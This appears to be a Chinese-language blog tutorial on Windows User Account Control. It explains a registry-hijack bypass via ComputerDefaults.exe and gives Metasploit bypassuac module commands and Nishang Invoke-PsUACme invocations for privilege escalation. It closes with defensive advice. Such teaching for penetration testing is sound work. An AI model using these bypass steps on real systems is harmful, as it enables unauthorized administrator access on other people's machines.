**目录**

[UAC](#t0)

[如何Bypass UAC](#t1)

[MSF下实战利用](#t2)

[Nishang中的Invoke-PsUACme.ps1](#t3)

[针对绕过UAC提权的防御措施](#t4)

* * *

UAC
---

**UAC(User Account Control，用户账号控制)**是微软为了提高系统安全性在Windows Vista中引入的技术。UAC要求用户在执行可能影响计算机运行的操作或在进行可能影响其他用户的设置之前，拥有相应的权限或者管理员密码。UAC在操作启动前对用户身份进行验证，以避免恶意软件和间谍软件在未经许可的情况下在计算机上进行安装操作或者对计算机设置进行更改。在Windows Vista及以后的版本中，微软设置了安全控制策略，分为高、中、低三个等级。高等级的进程有管理员权限；中等级的进程有普通用户权限；低等级的进程，权限是有限的，以保证系统在受到安全威胁时造成的损害最小。在权限不够的情况下，访问系统磁盘的根目录、Windows目录，以及读写系统登录数据库等操作，都需要经常UAC(User Account Control，用户账号控制)的认证。

![](https://img-blog.csdnimg.cn/20200807110055583.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**需要UAC的授权才能进行的操作列表如下：**

*   配置Windows Update
*   增加、删除账户
*   更改账户类型
*   更改UAC的设置
*   安装ActiveX
*   安装、卸载程序
*   安装设备驱动程序
*   将文件移动/复制到Program Files或Windows目录下
*   查看其它用户的文件夹

**UAC有如下四种设置要求：**

*   始终通知：这是最严格的设置，每当有程序需要使用高级别的权限时都会提示本地用户
*   仅在程序试图更改我的计算机时通知我：这是UAC的默认设置。当本地Windows程序要使用高级别的权限时，不会通知用户。但是，当第三方程序要使用高级别的权限时，会提示本地用户
*   仅在程序试图更改我的计算机时通知我(不降低桌面的亮度)：与上一条设置的要求相同，但在提示用户时不降低桌面的亮度
*   从不提示：当用户为系统管理员时，所有程序都会以最高权限运行

### 如何Bypass UAC

我们可以找一些以高权限运行的，但是并没有uac提示的进程，然后利用ProcessMonitor寻找他启动调用却缺失的如dll、注册表键值，然后我们添加对应的值达到bypass uac的效果。

以高权限运行的进程图标一般有如下标志：

![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9KTUgxcEVRN3FQNHgxV3RRU0ppYVJHc3NqMXp0MFoxSTBZZUQ2TzFJMjlFWXp4aEc3elZLZHMxcHVuRlhRdjlLYXNrTWt4b05nMG9DU3BQQzFXdnhFOVEvNjQw?x-oss-process=image/format,png)

我们win10以ComputerDefaults.exe作为bypass案例，ComputerDefaults.exe进程图标确实有个uac的标志（然后你双击打开会发现并没有uac提醒），

![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9KTUgxcEVRN3FQNHgxV3RRU0ppYVJHc3NqMXp0MFoxSTAxNFppYzI2TTNMZGlhUmFvV0VaQUpTWTA3Q2NZTWljSlE2UmRkTFBMQTR3TW5KOFk5MzVpY2pGdnNBLzY0MA?x-oss-process=image/format,png)

我们利用ProcessMonitor对该进程的行为做一个监听：

先寻找HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\Command 注册表，然后发现键值不存在，再寻找HKCR:\\ms-settings\\Shell\\Open\\Command\\DelegateExecute

![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9KTUgxcEVRN3FQNHgxV3RRU0ppYVJHc3NqMXp0MFoxSTBrNHFqemw2OGhtTzE1bXpGNG5sZW13MFMxR2lhQ3h4YVBCME12UmdKMmtXaWFqcTNpYTdxQ2liazR3LzY0MA?x-oss-process=image/format,png)

因此当我们修改hkcu注册表后，运行ComputerDefaults.exe就会得到一个bypass uac后的cmd：

![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9KTUgxcEVRN3FQNHgxV3RRU0ppYVJHc3NqMXp0MFoxSTB0UTNXV21aS1JMZGFsMGljc3I5VmdXd0tWZDdjSHBWbnljVHBpYVFqQTgwcjNPbzhrTjMwY2RpYWcvNjQw?x-oss-process=image/format,png)

![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9KTUgxcEVRN3FQNHgxV3RRU0ppYVJHc3NqMXp0MFoxSTBLbXNuYVdnZ3ppY3pYUHYwaWFyMmhFbk9SOXhZYXB2ZjVEY2thMGxpYXBQeW42b2ljWTU3b1JiZVNnLzY0MA?x-oss-process=image/format,png)

对了，当修改HKCU\\Software\\Classes\\下的键值时，会同步修改HKCR下面的键值。

参考：[https://mp.weixin.qq.com/s/OGiDm3IHBP3\_g0AOIHGCKA](https://mp.weixin.qq.com/s/OGiDm3IHBP3_g0AOIHGCKA)

### MSF下实战利用

**Bypassuac提权的MSF模块**

```
use exploit/windows/local/bypassuac  #该模块运行时会因为在目标机上创建多个文件而被杀毒软件识别，因此通过该模块提权成功率很低。      
use exploit/windows/local/bypassuac_injection  #该模块直接运行在内存的反射DLL中，所以不会接触目标机器的硬盘，从而降低了被杀毒软件检测出来的概率。
```


MSF中Bypassuac模块的使用前提有两个：

1.  一是系统当前用户必须在管理员组中，
2.  二是用户账户控制程序UAC设置为默认，即 “仅在程序试图更改我的计算机时通知我” 。

```
use exploit/windows/local/bypassuac      
set session 1      
set lhost 0.0.0.0                
set lport 24444                #本地监听的端口，随便设置一个未被占用的端口即可      
exploit
```


这里获取的test用户在管理员组中，且 UAC设置为默认，使用exploit/windows/local/bypassuac模块，攻击第二次成功！

![](https://img-blog.csdnimg.cn/20200214114128436.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

这里获取的test用户在管理员组中，且 UAC设置为默认，使用use exploit/windows/local/bypassuac\_injection模块，连续攻击两次都失败。提示32位的目标攻击64位的系统，但是我这里是使用的64为的target，也还是失败。

```
use exploit/windows/local/bypassuac_injection      
set session 1      
set target  1         #设置目标系统类型，1是64位，0是32位      
set lhost 0.0.0.0      
set lport 24444      
exploit
```


![](https://img-blog.csdnimg.cn/20200214115523948.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**Runas模块**

使用 exploit/windows/local/ask 模块，需要使用 EXE::Custom 选项创建一个可执行文件(需要免杀)，目标机器会运行一个发起提升权限请求的程序，提示用户是否要继续运行，如果用户选择继续运行程序，就会返回一个高权限的shell。

使用该模块的前提：

*   当前用户必须在管理员组中 或 知道管理员的密码，对UAC的设置则没有要求。
*   用户需要手动点击弹出的程序，是

![](https://img-blog.csdnimg.cn/20200214115838984.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### Nishang中的Invoke-PsUACme.ps1

Invoke-PsUACme模块使用来自UACME项目的DLL绕过UAC。

![](https://img-blog.csdnimg.cn/20200214120215653.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

```
Import-Module .\Invoke-PsUACme.ps1;Invoke-PsUACme -verbose  #使用sysprep方法并执行默认的payload      
Import-Module .\Invoke-PsUACme.ps1;Invoke-PsUACme -method oobe -verbose  #使用oobe方法并执行默认的payload
```


![](https://img-blog.csdnimg.cn/20200214124608416.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200214124856740.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

针对绕过UAC提权的防御措施
--------------

在企业网络环境中，防止绕过UAC的最好方法是不让内网机器的使用者拥有本地管理员权限，从而降低系统遭受攻击的可能性。

使用本地管理员权限登录的用户，要将UAC设置为“始终通知”或者删除该用户的本地管理员权限(这样设置后，会像在Windows Vista中一样，总是弹出警告)。

参考文章：[内网安全攻防：渗透测试实战指南](https://item.jd.com/12743210.html)

                  [CVE-2019-1388：Windows UAC 本地提权](https://mp.weixin.qq.com/s/mQqCuH6xOvYJC8-C0aRe4w)